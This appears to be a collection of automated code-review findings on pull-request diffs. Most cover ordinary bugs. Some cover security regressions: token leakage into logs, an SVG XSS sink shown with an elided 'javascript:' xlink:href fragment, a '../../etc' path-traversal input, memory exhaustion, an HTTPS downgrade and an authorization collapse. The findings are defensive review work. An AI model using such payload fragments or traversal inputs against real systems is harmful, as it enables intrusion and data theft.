findings.title: Docstring describes old return type (tuple), not new (dict)
findings.body:
The docstring states the function returns `(name, email)` as a tuple, but the implementation now returns a dict with keys `name`, `email`, and `tier`. Existing callers expecting tuple unpacking (like the one in reports/weekly.py that does `name, email = lookup_user(user_id)`) will break when they try to unpack a dict. The docstring must be updated to reflect the new contract.

_Also raised by the correctness agent:_ Docstring still promises a (name, email) tuple

findings.title: No test catches lookup_user's breaking return-shape change
findings.body: lookup_user now returns a dict instead of the (name, email) tuple documented in its own docstring and relied on by reports/weekly.py's render_row, which does `name, email = lookup_user(user_id)`. Unpacking a dict of 3 keys will raise a ValueError at runtime. There is no test in this diff (or referenced) that calls lookup_user and checks callers still work, so this contract break would ship undetected.

findings.title: WriteSettlement always returns nil, hiding failed inserts
findings.body:
The `db.Exec` error is bound in the `if` statement's scope, logged, and then discarded. The function then declares a fresh `var err error` (always nil) and returns it, so `WriteSettlement` reports success on every path after validation. Any caller doing `if err := WriteSettlement(...); err != nil { ... }` will treat a dropped settlement row as written — no retry, no alert, silent loss of financial records in the end-of-day batch.

If the intent really is log-and-continue, the function should not advertise an `error` return at all (or should return a distinguishable sentinel); otherwise return the insert error directly:

```go
if _, err := db.Exec(...); err != nil {
	log.Printf("settlement insert failed: %v", err)
	return err
}
return nil
```

findings.title: WriteSettlement has no test covering its error-swallowing return path
findings.body: WriteSettlement declares a fresh `var err error` at line 18 and returns it unconditionally, so the function always returns nil even when the db.Exec insert on line 15 fails (the failure is only logged). No test exists for this function, so this silent-success behavior — which is very likely a bug given the sibling function on line 7-9 correctly returns the exec error — would not be caught by anything in the current test suite.

findings.title: Mutable default `attempted=[]` accumulates across all calls
findings.body:
The default `[]` is evaluated once at function definition, so every call that omits `attempted` shares and mutates the same list. The second call returns the first call's failures appended to its own, and the list grows without bound for the process lifetime (also a slow memory leak for a long-running notifier). Any caller treating the return value as "recipients that failed in this batch" gets a wrong answer from the second call onward.

Use `def send_with_retries(recipients, attempted=None):` and `attempted = [] if attempted is None else attempted` at the top of the body.

The same shared list is also left partially populated if `_dispatch` raises mid-loop, since nothing resets it.

_Also raised by the security agent:_ Shared mutable default leaks recipients across calls

_Also raised by the docs agent:_ Public function send_with_retries lacks documentation

findings.title: No test covers send_with_retries or its mutable-default bug
findings.body: send_with_retries uses a mutable default argument `attempted=[]`, which accumulates across calls that don't pass an explicit list — a classic Python pitfall. There is no test in this diff exercising the function at all, so neither the intended retry behavior nor this bug would be caught by any existing suite.

findings.title: Rounding threshold changed from >= 0.5 to > 0.5 in a rename-only PR
findings.body:
Every other function in this diff is an exact rename with an identical body. `compute_rounding` is the sole exception: the predicate changed from `line.remainder_cents >= 0.5` to `line.remainder_cents > 0.5`. That flips the result for the exact boundary value 0.5 — the classic half-up rounding case — from 1 to 0, meaning a half-cent remainder now rounds down instead of up. In billing code this produces off-by-one-cent discrepancies on a reachable and common input, and it will not be caught by anyone reviewing this PR as a mechanical rename.

If the behaviour change is intentional, it belongs in its own commit with a test covering `remainder_cents == 0.5`. Otherwise restore `>=`.

_Also raised by the security agent:_ Rounding comparison silently changed from >= to > in a rename-only PR

findings.title: Operator change in compute_rounding undocumented
findings.body: The comparison in `compute_rounding` changed from `>=` to `>`, altering the rounding behavior at the 0.5 boundary. This semantic change is not documented in any comment or docstring. A caller expecting the old behavior (round-half-up) would get the new behavior (round-half-down) without warning. The module docstring on line 1 promises "Line-item calculators" but does not explain the rounding semantics now enforced by this change.

findings.title: Rounding boundary changed from >= to > with no test to catch it
findings.body: compute_rounding now returns 0 for line.remainder_cents == 0.5, whereas calc_rounding returned 1 in that case. This is a real behavior change disguised inside a mechanical rename PR. No test file is included in this diff, so nothing exercises the boundary value 0.5 to catch this regression.

findings.title: Off-by-one in page_of_sorted drops one record per page
findings.body:
`start` advances by `PAGE_SIZE` per page (line 11), but the slice ends at `start + PAGE_SIZE - 1` (line 12), so each page yields only `PAGE_SIZE - 1` records while the next page begins at `start + PAGE_SIZE`. The record at index `start + PAGE_SIZE - 1` is never returned by any page, so exactly one record per page is silently omitted from the export. The existing `page_of` on line 6 uses the correct `start : start + PAGE_SIZE`. Change line 12 to `return ordered[start : start + PAGE_SIZE]`.

Secondary effect: callers that detect the last page by `len(result) < PAGE_SIZE` will treat the very first page as terminal, truncating the export after one short page.

_Also raised by the docs agent:_ page_of_sorted returns asymmetric result vs page_of

findings.title: New paginated/sorted export function has no accompanying test
findings.body: page_of_sorted is new logic (sorting plus slicing with an off-by-one bound: start + PAGE_SIZE - 1) and no test exists in this diff to exercise it. A test that checks page boundaries (e.g. that each page returns PAGE_SIZE records and that consecutive pages cover all records without gaps) would have caught the truncation bug where each page returns one fewer record than page_of.

findings.title: Dropped None guard crashes on invoices without a purchase order
findings.body:
`Invoice.purchase_order` is typed `str | None` and documented as optional ("only set for customers on invoicing terms, which is roughly one account in twenty"). The removed `if invoice.purchase_order is not None:` guard was not redundant — the type is `Optional`, not `str`. With it gone, line 4 calls `.upper()` on `None` and raises `AttributeError: 'NoneType' object has no attribute 'upper'` for every invoice without a PO, which is the majority of accounts.

Secondarily, the return shape changed: the function previously returned 1 or 2 lines depending on the PO; it now unconditionally returns 2. Any caller that indexed or counted the result will see different behaviour even once the crash is fixed.

Restore the conditional append (or build the PO line only when the field is truthy) so the no-PO case still yields a single header line.

_Also raised by the docs agent:_ Function now silently fails for optional field

findings.title: Code contradicts documented behavior of purchase_order
findings.body: The `invoice.purchase_order` field is documented in models/invoice.py as optional ("only set for customers on invoicing terms"), but this code now calls `.upper()` on it unconditionally at line 4. This will raise an AttributeError when purchase_order is None. Either the field should no longer be optional (and its docstring should be updated), or the nil check should be restored.

findings.title: Removed None-guard on purchase_order lacks a regression test
findings.body: The diff removes the `if invoice.purchase_order is not None` check, but per models/invoice.py, purchase_order is `str | None` and is None for roughly 19 of 20 accounts. Calling `.upper()` on None will raise AttributeError for the common case. No test in this PR exercises header_lines with a None purchase_order (or with a non-None one), so this behavior change would go undetected until it hits production.

findings.title: File handle leaked on header-mismatch return and on exception
findings.body: `fh = open(path)` on line 10 is only closed on the success path (line 16). When the header check fails, line 14 returns `None` without closing `fh`; likewise any exception from `next(reader)` (line 12) or `list(reader)` (line 15) escapes with the handle open. On CPython this is masked by refcounting, but under PyPy or when an exception traceback keeps the frame alive the descriptor stays open, and an importer that scans many partner files will exhaust the fd limit. Rewrite using `with open(path) as fh:` wrapping the whole body, matching `read_rows` on lines 5-6.

findings.title: No test covers read_validated, including its leaky error path
findings.body: read_validated is new logic with a branch (header mismatch -> early return) and a resource-management concern (fh.close() is skipped on that branch). No test file is included in this diff, so nothing would catch a regression in the validation logic or the leak on the mismatched-header path.

findings.title: Public function `read_validated` lacks documentation of return contract
findings.body: The function `read_validated` is a public API (appears to be a partner-facing importer utility) whose return contract is not self-explanatory from its signature alone. Callers cannot safely determine whether `None` means "validation failed" vs. "file was empty but valid", and the function silently returns `None` when the header does not match without logging or raising an exception. This should be documented so callers know what to expect.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`@retry(attempts=3)` is applied to `charge_card`, which calls `billing.gateway.charge`. That function's docstring states plainly: "POST /charges. NOT idempotent: each call creates a new charge." A retry only distinguishes "request failed" from "response failed" if the operation is idempotent; a timeout or connection reset after the gateway has already accepted the POST will cause the wrapper to re-POST and create a second (and possibly third) charge against the customer's card. This is silent double-billing, not a transient error.

The gateway already offers the fix — the same docstring notes "The gateway supports an Idempotency-Key header; pass one to make retries safe." Generate a stable key per logical charge attempt (e.g. derived from an order/payment id, not from a per-call uuid, which would differ on each retry) and thread it through `charge(...)` before retrying. Until that key is plumbed through, `charge_card` should not be retried at all. Note the contrast with `fetch_charge` on lines 5-7, which is safe precisely because `get_charge` is documented "Safe to repeat."

_Also raised by the security agent:_ Retry wraps non-idempotent charge() without an Idempotency-Key

findings.title: Retry wrapper on non-idempotent operation lacks safety documentation
findings.body: The `charge_card` function wraps `charge()` with a `@retry` decorator. The underlying `charge()` operation is explicitly documented as "NOT idempotent: each call creates a new charge" and requires an Idempotency-Key header to make retries safe. The `charge_card` wrapper does not document how this safety requirement is being met, leaving callers unable to determine whether retries are actually safe. If the Idempotency-Key is not being passed through, this function silently violates the contract documented in `billing.gateway.charge()`.

findings.title: No test would catch retrying a non-idempotent charge call
findings.body: charge_card wraps billing.gateway.charge, which the docstring explicitly says is NOT idempotent and creates a new charge on each call, in a @retry(attempts=3) decorator with no idempotency key passed. There is no test in this diff (or referenced) that exercises retry behavior against a transient failure to verify charge_card doesn't create duplicate charges. If the retry logic is wired up incorrectly, or if callers assume retries are safe as they are for fetch_charge, nothing here would fail — the bug would only surface as duplicate real-world charges in production.

findings.title: Naive datetime subtracted from tz-aware expires_at raises TypeError
findings.body:
`datetime.now()` on line 9 returns a naive local datetime, but `Invite.expires_at` is documented as always timezone-aware UTC. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so line 10 fails for every invite — the function can never return. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. Separately, dropping to local wall-clock time would also have given a wrong answer by the UTC offset even if the types had matched.

_Also raised by the docs agent:_ Timezone-aware and timezone-naive datetime comparison

findings.title: expires_within has no test, and would fail on first real call
findings.body: expires_within is new, untested code. Calling it with a real Invite (expires_at is tz-aware per models/invite.py) would raise TypeError on `invite.expires_at - cutoff` since cutoff comes from datetime.now() (naive). No test exercises this function, so this break would not be caught before it reaches production.

findings.title: contactEmail dereferences optional billingContact without a guard
findings.body: `Account.billingContact` is declared optional (`billingContact?:`) and documented as "Absent until the customer completes onboarding", so for any pre-onboarding account `account.billingContact` is `undefined` and `.email.toLowerCase()` throws `TypeError: Cannot read properties of undefined`. The sibling function `bannerFor` on line 4 already treats the field as possibly absent via `?.` plus a `??` default, which confirms the absent case is reachable on this page. Under `strictNullChecks` this will also fail to compile. Mirror the existing pattern, e.g. `return account.billingContact?.email.toLowerCase() ?? "";` — or make the missing-contact case explicit by returning `string | undefined` and letting callers decide the fallback.

findings.title: Public function lacks contract documentation for optional field
findings.body: The `contactEmail` function is exported as a public API but has no documentation explaining that it assumes `billingContact` is present. The function accesses `account.billingContact.email` without the optional chaining operator (`?.`) used in `bannerFor`, but according to the `Account` interface, `billingContact` is optional ("Absent until the customer completes onboarding"). A caller could pass a valid `Account` with no `billingContact` and receive a runtime error. The function needs either: (1) a docstring stating the precondition that `billingContact` must be present, or (2) defensive code that handles the absent case, like the neighboring `bannerFor` function does.

findings.title: contactEmail lacks a test covering missing billingContact
findings.body: contactEmail accesses account.billingContact.email without optional chaining, despite Account.billingContact being documented as optional (absent until onboarding completes). No test exists for this function, so a call with an account lacking billingContact would throw at runtime and nothing in the test suite would catch it.

findings.title: Timeout argument mismatches documented units (ms vs s)
findings.body: The new function `sync_partner_catalogue()` calls `fetch("https://partner.example.com/catalogue", timeout=30)` passing 30 as the timeout. According to the `fetch()` docstring in `clients/http.py`, the timeout parameter is in MILLISECONDS, and callers wanting seconds must multiply. The value 30 passed here will be interpreted as 30ms (0.03 seconds), not 30 seconds as the comment in the PR suggests ("Timeout set generously since their API is slow"). This will cause the request to timeout almost immediately. Either multiply by 1000 to pass 30000ms, or document why 30ms is intentional.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch()` documents `timeout` as MILLISECONDS and passes it straight through as `timeout_ms`. Passing `30` therefore gives a 30 ms budget, shared across all 3 default retries, to an API the PR description itself calls slow — this call will almost certainly time out every night. If 30 seconds was intended, pass `timeout=30_000`.

findings.title: New sync_partner_catalogue has no test covering its behavior
findings.body: sync_partner_catalogue() is a new function that calls fetch(...) with timeout=30. fetch's docstring states timeout is in milliseconds, so a value of 30 likely means the call times out almost immediately rather than waiting 30 seconds as the PR description implies ('timeout set generously since their API is slow'). There is no test in this diff exercising this function, so a wrong timeout value, a wrong URL, or a broken fetch call would go undetected. Add a test that mocks fetch and asserts it's called with the correct timeout_ms/args, or an integration-style test asserting the returned value is passed through correctly.

findings.title: Index duplicates existing invoices_tenant_created_idx from migration 0007
findings.body: `invoices_tenant_recent_idx` is defined on `invoices (tenant_id, created_at DESC)` — byte-for-byte the same table, columns and sort order as `invoices_tenant_created_idx`, already applied in migrations/0007_invoice_indexes.sql on 2025-11-02. `IF NOT EXISTS` matches on index *name*, not on definition, so it will not suppress this: Postgres will happily build a second, fully redundant index. The cost is a duplicated write amplification on every insert/update of `invoices`, plus the disk and the build time, for zero read benefit — the planner will just pick one of them. If the reporting query is genuinely not using the existing index, the problem is elsewhere (e.g. a predicate the index doesn't cover) and a second identical index won't fix it. Drop this statement, or state explicitly what it does that 0007's index does not.

findings.title: Referer logged unscrubbed, leaking the auth token into logs
findings.body:
The removed branch specifically special-cased `Referer` and passed it through `_scrub_uri(value, extra_param_keys)` before logging. The retrieved `token_authenticated_url` in `jupyter_server/auth/identity.py` documents that notebook URLs are handed out as `{base}?token={token}`, and that "the browser sends the token back in the Referer header on every subresource request". With the scrubbing gone, any 5xx triggered while a token-bearing page is loading writes a live auth token into the server log in plaintext — logs are typically world-readable on the host, shipped to aggregators, and attached to bug reports.

Restore the scrub for `Referer` (and keep passing `extra_param_keys` through), or redact the query string entirely before logging. Note also that `extra_param_keys` is now unused by this loop, so callers that pass it are silently getting no sanitisation — if the goal was to simplify, the parameter should have been removed from the signature, which would have surfaced this at the call sites.

_Also raised by the security agent:_ Auth token leaked into logs via unscrubbed Referer header

_Also raised by the tests agent:_ No test guards against Referer token leaking into logs

findings.title: Referer header scrubbing removed but possibly documented elsewhere
findings.body: The diff removes the `_scrub_uri()` call that was filtering sensitive query parameters from Referer headers before logging. The repository context shows that Jupyter passes auth tokens as URL query parameters (see `token_authenticated_url` in `auth/identity.py`), which means Referer headers will now contain exposed tokens in logs. Check whether any documentation, docstrings, or comments in the codebase describe this logging function as scrubbing sensitive data from headers. If such documentation exists, it is now stale and misleading.

findings.title: xlink:href no longer scheme-validated, reopening SVG XSS sink
findings.body:
`validateProp` previously funnelled `href`, `src` and `xlinkhref` into `isAnchorLinkAllowed`, which rejects the `unsafeLinkPrefix` schemes (`javascript:`, `data:text/html`, `vbscript:`). After this change `xlinkhref` falls through that branch and reaches whatever the default/permissive return path is, so a value like `<svg><a xlink:href="javascript:...">` survives sanitisation and executes on click in browsers that still honour `xlink:href` on SVG `<a>`.

Entry point: author-supplied markdown, which the file header states includes end-user submitted content. Sink: the rendered attribute in the DOM. `validateProp` is described in the surrounding context as the only control between the two.

If the goal is to shrink the attribute list, drop attributes that are *not* URL-bearing. `xlink:href` must stay on the `isAnchorLinkAllowed` path (and ideally be matched in both its normalised `xlinkhref` and colon forms).

_Also raised by the correctness agent:_ Dropping xlinkhref from the URL check disables sanitisation, not the attribute

findings.title: No test guards removal of xlinkhref validation
findings.body: The change removes 'xlinkhref' from the set of attributes routed through isAnchorLinkAllowed. Given the file's stated purpose (validateProp is the only thing standing between author-supplied markdown and the DOM), this attribute was presumably included to block javascript:/data:/vbscript: payloads via SVG xlink:href. No test in this diff (or referenced) exercises attribute === 'xlinkhref' with an unsafe value, so if this trim is wrong (i.e., xlinkhref can still carry a dangerous URI to the DOM), nothing here would fail.

findings.title: Removing ValidateID breaks buildPath's documented caller precondition
findings.body:
`projectQueryParameter` comes straight from the request query string and, after this change, flows onward with no identifier check. The file DAO's `buildPath` documents the opposite contract: "It does no validation of its own: callers are required to have validated the names before this point." `filepath.Join(d.Folder, project, kind)` cleans the result but does not confine it — a project value such as `../../etc` resolves outside `d.Folder`, so a list request can be pointed at arbitrary directories on disk.

The PR description argues the join already scopes under the folder root; that is not true of `filepath.Join`, which only normalises and will happily walk above its first argument when later components contain `..`.

Restore the `common.ValidateID(projectQueryParameter)` check before the value is used (or, if the intent is to move validation down a layer, add the containment check inside `buildPath` and update its contract comment). Note also that line 4 only compares the query parameter against `parameters.Project` when the latter is non-empty, so the path-parameter validation cannot be relied on to cover this input.

_Also raised by the security agent:_ Removing ValidateID lets `project` query param traverse out of storage root

findings.title: Removed project-name validation has no test guarding the query-path behavior
findings.body: The diff removes the common.ValidateID(projectQueryParameter) check that previously rejected malformed/unsafe project name query parameters before they reach buildPath (which explicitly documents that it does no validation and relies on callers). No test in this PR exercises list() with a malicious or malformed projectQueryParameter (e.g. containing '../' or other path-unsafe characters) to confirm the resulting behavior is still safe or correctly rejected. If the removal reintroduces unvalidated input reaching buildPath, nothing here would fail.

findings.title: Attacker-controlled Content-Length drives buffer pre-allocation
findings.body:
`contentLength` on an S3 UploadPart request comes from the client's `Content-Length` header and is not validated anywhere in this hunk before being handed to `Reserve`. A request declaring a huge length (e.g. tens of gigabytes) with a tiny or slow body causes the server to commit that much memory up front, before a single byte is read; a handful of concurrent requests exhausts the process. The previous code grew the buffer as bytes actually arrived, so the memory used was bounded by the data actually delivered.

Clamp the reservation to a sane ceiling before calling it, e.g. `rw := multipart.NewRW(); if contentLength > 0 { rw.Reserve(min(contentLength, maxPartSize)) }`, and/or reject parts whose declared length exceeds the configured maximum part size before allocating.

_Also raised by the security agent:_ Buffer pre-reserved from attacker-declared Content-Length

findings.title: No test covers new Reserve(contentLength) pre-allocation behavior
findings.body: The change switches from lazy, page-at-a-time growth to eagerly reserving contentLength bytes via multipart.NewRW().Reserve(contentLength). This is exactly the kind of behavior change (memory pre-allocation driven by an external/declared length) that should have a test verifying correct behavior for normal-size uploads, and ideally a test/guard for what happens when contentLength is large, zero, negative, or mismatched with actual body size. No test file is included in this diff, so a regression here (e.g. Reserve panicking on a huge or negative contentLength, or silently mis-sizing the buffer) would not be caught by CI.

findings.title: Default S3 scheme silently downgraded from https to http
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` only selected plaintext when the caller explicitly set `is_secure = False`; every other case — including the common case where `is_secure` is simply not present in `request.meta` — resolved to `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats the missing key (`.get` returns `None`) as falsy, so the default flips to `http`. Existing callers that never set `is_secure` and relied on the secure default will now transmit S3 requests, including the AWS signature/authorization headers built for this request, over an unencrypted connection.

The truthiness test also changes behaviour for any other falsy value (`0`, `""`), which previously yielded `https`.

If the ternary is to be kept, preserve the default explicitly, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"` or `request.meta.get("is_secure", True)`.

findings.title: S3 requests default to plaintext HTTP after ternary inversion
findings.body:
The original expression `"http" if request.meta.get("is_secure") is False else "https"` defaults to **https** and only downgrades when a caller explicitly sets `request.meta["is_secure"] = False`. The replacement `"https" if request.meta.get("is_secure") else "http"` defaults to **http** whenever the key is missing, `None`, `0`, or `""` — which is the normal case, since most callers never set this meta key at all.

The resulting `url` on line 6 is what the handler actually fetches, so every S3 download that does not opt in now travels unencrypted: object contents in cleartext, and AWS authorization headers (access key id plus the request signature) exposed to any network observer or active MITM, who can also tamper with the response body.

Fix: restore the fail-secure default, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or `scheme = "https" if request.meta.get("is_secure", True) else "http"` if the simpler ternary form is preferred.

findings.title: S3 scheme logic inverted without updating docstring
findings.body:
The logic for selecting S3 URL scheme has been inverted: previously, `is_secure=False` explicitly selected HTTP, while `is_secure=True` or unset defaulted to HTTPS. The new code reverses this: it now defaults to HTTP unless `is_secure` is explicitly truthy.

If there is a docstring or comment explaining the original `is_secure` parameter semantics, it will now be incorrect. The new default (HTTP for unsigned requests) contradicts typical security practices for AWS S3, which should default to HTTPS. Callers relying on documented behavior expecting HTTPS-by-default will now get HTTP.

findings.title: Default scheme behavior change lacks visible test coverage
findings.body: The change flips the default scheme: previously, when `is_secure` was absent (not explicitly False), the URL defaulted to https; now it defaults to http unless `is_secure` is truthy. This is a security-relevant behavior change (default becomes plaintext), and no test asserting the resulting scheme for the unset/falsy `is_secure` case is included in this diff. If a test exists elsewhere asserting scheme=='https' when is_secure is omitted, it should now fail — but none is shown, so this regression could land unnoticed.

findings.title: DELETE now authorizes as "push", removing the delete permission check
findings.body:
The removed `case http.MethodDelete: action = "delete"` branch means DELETE requests now fall into the `!= GET && != HEAD` arm and are checked against the `push` action. Any account granted push on a repository can now delete tags/manifests, and any policy that grants `delete` but not `push` will start failing closed. The retrieved config documentation states the three actions are distinct on purpose precisely so that "an account may be allowed to push new tags without being allowed to delete existing ones" — this collapse removes that guarantee. Restore an explicit branch mapping `http.MethodDelete` to `"delete"`.

_Also raised by the security agent:_ DELETE now authorises as "push", granting delete to push-only accounts

findings.title: No visible test coverage for collapsed DELETE→push authorization mapping
findings.body: This change removes the distinct 'delete' action and now maps HTTP DELETE requests to the 'push' action instead of 'delete'. This is a meaningful authorization behavior change: an account granted push access (but not delete access) would now be authorized to delete resources, per the repository's own documentation stating these actions are 'distinct on purpose.' No test file is part of this diff, so there is no evidence a test asserts action=='delete' for MethodDelete or verifies that push-only accounts cannot delete. If such a test exists elsewhere and still passes after this change, that would itself indicate the test was checking the wrong thing or was updated to accept the regression; if no such test exists, this behavior change is currently uncaught by any test.

findings.title: Unknown methods (OPTIONS, TRACE) now require push instead of pull
findings.body: The old `default:` arm mapped any method outside the enumerated set to `"pull"`. The new condition is a negation of GET/HEAD only, so OPTIONS, TRACE and any other verb now require `push` access. CORS preflight (OPTIONS) from an anonymous or pull-only client will be rejected where it previously succeeded. If the intent was "reads pull, writes push", the condition should enumerate the write verbs rather than negate the read verbs.

findings.title: Size guard clears the entry just written, defeating the cache write
findings.body:
`get_tenant_fresh` stores the fetched tenant on line 10 and then, if the cache has grown past 1000 entries, calls `_CACHE.clear()` on line 12. The clear happens after the insert, so the entry this call just populated is thrown away together with everything else; a following `get_tenant(tenant_id)` (line 5) returns `None` even though a live fetch just succeeded. On a warm cache this fires on roughly every 1001st distinct tenant and wipes all state for all callers, not just an over-quota portion.

If the intent is a bounded cache, evict before inserting and evict selectively (e.g. pop the oldest key, or use an `OrderedDict`/`functools.lru_cache`-style bound) so the freshly fetched value survives the call that fetched it.

findings.title: Unvalidated tenant_id lets a caller flush the shared cache
findings.body:
`get_tenant_fresh` unconditionally inserts `tenant_id` into the module-level `_CACHE` and, once the cache passes 1000 entries, calls `_CACHE.clear()`, discarding every other tenant's entry. If this function is reachable from a request handler with a caller-supplied identifier, an attacker can request ~1000 arbitrary ids (they need not exist — `_fetch` results, including misses, are stored on line 10) and force a full flush, sending all subsequent `get_tenant` traffic to the backing store: a cheap amplification / thundering-herd DoS that affects all tenants, not just the caller.

Two concrete mitigations: (a) validate/authorize `tenant_id` before it becomes a cache key, and only store results for tenants that actually resolved, so unknown ids cannot occupy slots; (b) replace the `clear()` eviction with bounded LRU eviction (e.g. `collections.OrderedDict` + `popitem(last=False)`, or `functools.lru_cache`) so overflow evicts one entry rather than the whole cache.

I cannot see the entry point — no caller of `get_tenant_fresh` appears in the diff or in retrieved context — so this is conditional on the function being exposed to untrusted input.

findings.title: Function name misleads about cache side effects
findings.body: `get_tenant_fresh` suggests a read operation (consistent with the existing `get_tenant`), but it actually mutates the cache by writing the tenant and clearing it if size exceeds 1000. A caller expecting a pure fetch could misuse this function in contexts where cache mutation is unwanted or unsafe. Rename to reflect the mutation: `fetch_and_cache_tenant` or `refresh_tenant_cache` would accurately convey that this writes to the cache.

findings.title: No test coverage for get_tenant_fresh behavior
findings.body: get_tenant_fresh fetches, caches, and conditionally clears the entire cache when it exceeds 1000 entries. None of this is exercised by any test in the diff, so a bug (e.g. wrong eviction threshold, clearing instead of evicting one entry, or _fetch not being called) would go unnoticed. Add tests asserting: the returned value matches _fetch's result, the cache is updated with that value, and the clear-on-overflow logic triggers correctly at the boundary.

findings.title: README documents renamed flag as `--workers`
findings.body:
